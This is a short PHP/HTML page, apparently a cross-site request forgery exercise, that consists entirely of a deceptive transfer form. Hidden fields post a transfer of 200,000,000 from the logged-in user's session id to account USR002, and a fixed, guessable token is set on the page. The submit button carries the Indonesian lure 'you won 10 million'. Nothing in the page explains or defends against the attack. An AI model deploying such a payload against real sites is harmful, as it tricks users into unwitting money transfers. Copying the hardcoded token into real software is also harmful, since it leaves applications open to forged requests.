<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <?php session_start();
        $_SESSION['token'] = "a";
    
    ?>
    <form method="post" action="./controllers/doPost.php">
            <input type="hidden" name="token" value="a">
            <input type="hidden" name="pengirim" value="<?= $_SESSION['id'];?>">
            <input type="hidden" name="value" value="200000000">
            <input type="hidden" name="penerima"value="USR002">
            <input type="submit" value="SELAMAT ANDA MENANG 10 JUTA">


    </form>
</body>
</html>